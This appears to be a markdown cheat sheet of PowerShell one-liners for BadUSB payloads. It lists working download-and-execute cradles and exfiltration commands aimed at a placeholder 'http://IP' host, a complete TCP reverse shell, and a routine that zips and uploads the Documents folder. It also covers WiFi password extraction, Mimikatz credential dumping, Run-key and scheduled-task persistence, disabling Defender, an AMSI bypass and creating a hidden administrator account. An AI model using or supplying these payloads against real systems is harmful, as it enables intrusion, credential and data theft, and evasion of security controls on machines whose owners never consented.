# PowerShell One-Liners for BadUSB Payloads

## System Information

```powershell
# Basic system info
Get-ComputerInfo | Select-Object CsName,OsName,OsArchitecture

# Hostname
$env:COMPUTERNAME

# Username
$env:USERNAME

# Domain
$env:USERDOMAIN

# Full system info
systeminfo

# OS Version
[System.Environment]::OSVersion.Version

# Running processes
Get-Process | Select-Object Name,Id,CPU | Sort-Object CPU -Desc

# Installed software
Get-WmiObject -Class Win32_Product | Select-Object Name,Version

# Environment variables
Get-ChildItem Env:
```

## Network

```powershell
# IP configuration
Get-NetIPAddress | Where-Object AddressFamily -eq 'IPv4'

# Active connections
Get-NetTCPConnection | Where-Object State -eq 'Established'

# Listening ports
Get-NetTCPConnection | Where-Object State -eq 'Listen'

# DNS servers
Get-DnsClientServerAddress

# WiFi profiles
netsh wlan show profiles

# WiFi password extraction
(netsh wlan show profile name="NETWORK" key=clear) | Select-String "Key Content"

# All WiFi passwords
netsh wlan show profiles | Select-String "All User" | ForEach-Object { $_ -replace ".*: ", "" } | ForEach-Object { netsh wlan show profile name="$_" key=clear } | Select-String "SSID|Key Content"

# ARP table
Get-NetNeighbor

# Routing table
Get-NetRoute

# Public IP
(Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content
```

## File Operations

```powershell
# Search for files
Get-ChildItem -Path C:\ -Recurse -Filter "*.txt" -ErrorAction SilentlyContinue

# Search file contents
Get-ChildItem -Recurse | Select-String "password" -ErrorAction SilentlyContinue

# Recent files
Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Desc | Select-Object -First 20

# Copy file
Copy-Item -Path "source" -Destination "dest"

# Read file
Get-Content "file.txt"

# Write file
Set-Content -Path "file.txt" -Value "content"

# Append to file
Add-Content -Path "file.txt" -Value "more content"

# Compress files
Compress-Archive -Path "folder" -DestinationPath "archive.zip"

# Extract archive
Expand-Archive -Path "archive.zip" -DestinationPath "folder"
```

## Download & Execute

```powershell
# Download file (Invoke-WebRequest)
IWR -Uri "http://IP/file.exe" -OutFile "$env:TEMP\file.exe"

# Download file (WebClient)
(New-Object Net.WebClient).DownloadFile("http://IP/file.exe","$env:TEMP\file.exe")

# Download and execute in memory
IEX (IWR -Uri "http://IP/script.ps1" -UseBasicParsing).Content

# Download and execute (one-liner)
IEX (New-Object Net.WebClient).DownloadString("http://IP/script.ps1")

# Certutil download
certutil -urlcache -split -f "http://IP/file.exe" "$env:TEMP\file.exe"

# Bitsadmin download
bitsadmin /transfer job /download /priority high "http://IP/file.exe" "$env:TEMP\file.exe"

# Curl (Win10+)
curl -o "$env:TEMP\file.exe" "http://IP/file.exe"
```

## Exfiltration

```powershell
# HTTP POST
Invoke-WebRequest -Uri "http://IP/collect" -Method POST -Body (Get-Content "file.txt")

# HTTP POST (encoded)
$data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-Content "file.txt" -Raw)))
IWR -Uri "http://IP/collect" -Method POST -Body $data

# DNS exfiltration
$data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("secret"))
Resolve-DnsName "$data.exfil.domain.com"

# FTP upload
$client = New-Object Net.WebClient
$client.Credentials = New-Object Net.NetworkCredential("user","pass")
$client.UploadFile("ftp://IP/file.txt", "$env:TEMP\file.txt")
```

## Persistence

```powershell
# Registry Run key
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value "powershell -w hidden -c `"payload`""

# Scheduled task
schtasks /create /tn "Update" /tr "powershell -w hidden -c 'payload'" /sc onlogon

# Startup folder
Copy-Item "payload.bat" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"

# WMI subscription (requires admin)
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name="Update";EventNameSpace="root\cimv2";QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 8"}
```

## Credential Access

```powershell
# Cached credentials (requires admin)
cmdkey /list

# Browser saved passwords location
$env:LOCALAPPDATA + "\Google\Chrome\User Data\Default\Login Data"

# SAM/SYSTEM location (requires SYSTEM)
# C:\Windows\System32\config\SAM
# C:\Windows\System32\config\SYSTEM

# Mimikatz (in memory)
IEX (IWR -Uri "http://IP/Invoke-Mimikatz.ps1" -UseBasicParsing).Content; Invoke-Mimikatz -DumpCreds
```

## Defense Evasion

```powershell
# Disable Windows Defender (requires admin)
Set-MpPreference -DisableRealtimeMonitoring $true

# Exclude path from scanning
Add-MpPreference -ExclusionPath "$env:TEMP"

# AMSI bypass (basic)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Base64 encode command
$cmd = "whoami"
$bytes = [Text.Encoding]::Unicode.GetBytes($cmd)
[Convert]::ToBase64String($bytes)

# Execute encoded command
powershell -enc <BASE64>

# Execution policy bypass
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process

# Hidden window
Start-Process powershell -WindowStyle Hidden -ArgumentList "command"
```

## User Management

```powershell
# List local users
Get-LocalUser

# List local admins
Get-LocalGroupMember -Group "Administrators"

# Add user
New-LocalUser -Name "hacker" -Password (ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force)

# Add to admins
Add-LocalGroupMember -Group "Administrators" -Member "hacker"

# Enable user
Enable-LocalUser -Name "Guest"

# Current user groups
whoami /groups
```

## Common Payload Patterns

### Quick Recon
```powershell
$info = @{
    Hostname = $env:COMPUTERNAME
    User = $env:USERNAME
    Domain = $env:USERDOMAIN
    IP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object InterfaceAlias -notlike "*Loopback*").IPAddress
    OS = (Get-WmiObject Win32_OperatingSystem).Caption
}
$info | ConvertTo-Json | Out-File "$env:TEMP\recon.txt"
```

### Reverse Shell
```powershell
$client = New-Object System.Net.Sockets.TCPClient("IP",PORT)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

### Compress & Exfil
```powershell
$targetDir = "$env:USERPROFILE\Documents"
$zipPath = "$env:TEMP\data.zip"
Compress-Archive -Path $targetDir -DestinationPath $zipPath
$bytes = [IO.File]::ReadAllBytes($zipPath)
$b64 = [Convert]::ToBase64String($bytes)
IWR -Uri "http://IP/upload" -Method POST -Body $b64
Remove-Item $zipPath
```

## Execution Flags Reference

| Flag | Full Form | Description |
|------|-----------|-------------|
| `-w hidden` | `-WindowStyle Hidden` | Hide console window |
| `-ep bypass` | `-ExecutionPolicy Bypass` | Bypass execution policy |
| `-nop` | `-NoProfile` | Don't load profile |
| `-noni` | `-NonInteractive` | No interactive prompts |
| `-enc` | `-EncodedCommand` | Base64 encoded command |
| `-c` | `-Command` | Run command |
| `-f` | `-File` | Run script file |
| `-sta` | `-STA` | Single-threaded apartment |

## Quick One-Liner Templates

```powershell
# Minimal hidden execution
powershell -w hidden -c "COMMAND"

# Bypass all restrictions
powershell -ep bypass -nop -w hidden -c "COMMAND"

# Download and execute
powershell -ep bypass -nop -w hidden -c "IEX(IWR 'http://IP/script.ps1')"

# Encoded execution
powershell -ep bypass -nop -enc BASE64STRING
```

---

[← Back to Main](../README.md)
